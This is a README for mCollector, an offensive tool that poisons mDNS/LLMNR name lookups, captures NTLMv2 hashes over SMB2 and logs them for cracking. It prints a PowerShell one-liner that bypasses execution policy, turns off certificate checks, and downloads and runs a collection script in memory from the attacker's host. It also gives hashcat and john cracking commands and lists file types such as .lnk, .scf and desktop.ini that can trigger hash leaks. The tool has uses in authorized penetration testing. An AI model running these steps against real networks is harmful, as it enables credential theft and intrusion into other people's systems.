# mCollector Client & Server

Server is a single-binary NTLMv2 hash capture tool with built-in HTTPS file server and automatic name resolution. No Python, no dependencies at runtime — one `make`, one binary.
Client is a powershell based script.

When a Windows machine accesses `\\mytt`, mCollector resolves the name via mDNS/LLMNR, captures the NTLMv2 hash over SMB2, and logs it in hashcat-ready format.

## Features

- **SMB2 NTLMv2 capture** — grabs hashes from any `\\mytt` UNC access
- **mDNS + LLMNR responder** — built-in, no external Responder tool needed
- **HTTPS file server** — serve scripts, receive uploads (up to 100MB)
- **Embedded TLS certificates** — works out of the box, zero config
- **In-memory PowerShell collection** — client script runs without touching disk
- **Deduplication** — each user captured once, persisted across restarts
- **Single binary** — everything compiled into one ~170KB executable

## Quick Start

```bash
git clone https://github.com/cmardikas/mCollector.git
cd mCollector
make
sudo ./mCollector
```

On the Windows target, open `cmd` or `Run` (Win+R):
```
\\mytt
```

Or run the collection script directly in memory:
Trust self made cert & force TLS12
```
powershell -ep bypass -c "Add-Type 'using System.Net;using System.Net.Security;using System.Security.Cryptography.X509Certificates;public class T:ICertificatePolicy{public bool CheckValidationResult(ServicePoint s,X509Certificate c,WebRequest r,int p){return true;}}';[Net.ServicePointManager]::CertificatePolicy=New-Object T;[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;IEX(New-Object Net.WebClient).DownloadString('https://mytt/mCollector.ps1')
```

## Prerequisites

```bash
# Debian / Kali / Ubuntu
sudo apt install build-essential libssl-dev

```

## Build

```bash
make clean
make
```

## Usage

```
sudo ./mCollector [options]

  -c, --clear   Clear uploads directory and exit
  -h, --help    Show help
```

### Important: disable systemd-resolved LLMNR

On systems with `systemd-resolved`, LLMNR packets on port 5355 may be intercepted, disable it.


## Output

```
             ██████╗ ██████╗ ██╗     ██╗     ███████╗ ██████╗████████╗ ██████╗ ██████╗
            ██╔════╝██╔═══██╗██║     ██║     ██╔════╝██╔════╝╚══██╔══╝██╔═══██╗██╔══██╗
  ██╗████╗  ██║     ██║   ██║██║     ██║     █████╗  ██║        ██║   ██║   ██║██████╔╝
  ██╔██╔██╗ ██║     ██║   ██║██║     ██║     ██╔══╝  ██║        ██║   ██║   ██║██╔══██╗
  ██║╚╝ ██║ ╚██████╗╚██████╔╝███████╗███████╗███████╗╚██████╗   ██║   ╚██████╔╝██║  ██║
  ╚═╝   ╚═╝  ╚═════╝ ╚═════╝ ╚══════╝╚══════╝╚══════╝ ╚═════╝   ╚═╝    ╚═════╝ ╚═╝  ╚═╝
                                    S E R V E R

  version   : 1.2.0
  build     : Mar 26 2026 12:00:00
  hashes    : uploads/hashes.txt                      hashcat -m 5600
  loaded    : 1 previously captured user(s)

  PROTO   ADDRESS                                     PURPOSE
  ──────  ──────────────────────────────────────  ───────────────────
  eth0    https://10.0.0.100:443                      file server
          http://10.0.0.100:80                        -> redirects to HTTPS
  NAT     203.0.113.1                                 external
  SMB     0.0.0.0:445                                 NTLMv2 capture
  mDNS    224.0.0.251:5353                            mytt.local -> SMB
  LLMNR   224.0.0.252:5355                            mytt -> SMB

  [mDNS]  mytt.local. -> 10.0.0.100  (from 10.0.0.50)

  [★] NTLMv2  CORP\jsmith  (ws: PC-PC01)
      jsmith::CORP:<challenge>:<proof>:<blob>...
```

## How It Works

```
Windows client                              mCollector (Kali)
      │                                            │
      │──── LLMNR query "mytt" ──────────────────►│ :5355
      │◄─── 192.168.88.34 ────────────────────────│
      │                                            │
      │──── SMB2 Negotiate ──────────────────────►│ :445
      │◄─── SMB2 Negotiate Response ──────────────│
      │──── SessionSetup (NTLMSSP_NEGOTIATE) ────►│
      │◄─── SessionSetup (NTLMSSP_CHALLENGE) ────│
      │──── SessionSetup (NTLMSSP_AUTH) ─────────►│ ← hash captured
      │◄─── STATUS_ACCESS_DENIED ─────────────────│
```

## Network Ports

| Port | Protocol | Purpose |
|------|----------|---------|
| 80   | HTTP     | Redirects to HTTPS |
| 443  | HTTPS    | File server + uploads |
| 445  | TCP      | SMB2 NTLMv2 capture |
| 5353 | UDP      | mDNS (`mytt.local`) |
| 5355 | UDP      | LLMNR (`mytt`) |

## Cracking Captured Hashes

```bash
# hashcat
hashcat -m 5600 uploads/hashes.txt wordlist.txt

# john
john --format=netntlmv2 uploads/hashes.txt --wordlist=wordlist.txt
```

## Web Interface

| Endpoint | Description |
|----------|-------------|
| `https://<ip>/` | Upload page + copy-paste commands |
| `https://<ip>/mCollector.ps1` | PowerShell collection script |
| `https://<ip>/PingCastle.exe` | PingCastle binary |
| `POST https://<ip>/upload` | File upload (multipart) |
| `https://<ip>/uploads/` | Browse uploaded files |

## Triggering Hash Capture from Windows

```powershell
# UNC path (Run dialog, Explorer, cmd)
\\mytt

# net view
net view \\mytt

# dir
dir \\mytt\share

# PowerShell
ls \\mytt\c$

# Also works via: .lnk files, .scf files, .url files,
# documents with embedded UNC paths, desktop.ini
```

## Custom Hostname

Edit `NR_HOSTNAME` in `mCollector.c` and rebuild:

```c
#define NR_HOSTNAME "mytt"
```

## Custom TLS Certificates

Embedded self-signed certs work out of the box (CN=mytt.local, ~2000 year validity). To override, place `cert.pem` and `key.pem` in the working directory:

```bash
openssl req -x509 -newkey rsa:2048 -days 730000 -nodes \
    -keyout key.pem -out cert.pem -subj "/CN=mytt.local"
```

## Project Files

| File | Description |
|------|-------------|
| `mCollector.c` | Main source — SMB2, HTTPS, CLI |
| `nameresolver.c` | mDNS + LLMNR responder module |
| `nameresolver.h` | Name resolver API |
| `mongoose.c` / `mongoose.h` | [Mongoose](https://github.com/cesanta/mongoose) HTTP library |
| `mdns.h` | [mjansson/mdns](https://github.com/mjansson/mdns) mDNS library |
| `mCollector.ps1` | PowerShell client collection script |
| `index.html` | Web upload interface |
| `Makefile` | Build configuration |

## Credits

- [Mongoose](https://github.com/cesanta/mongoose) — embedded HTTP/HTTPS server
- [mjansson/mdns](https://github.com/mjansson/mdns) — public domain mDNS/DNS-SD library

## License

MIT
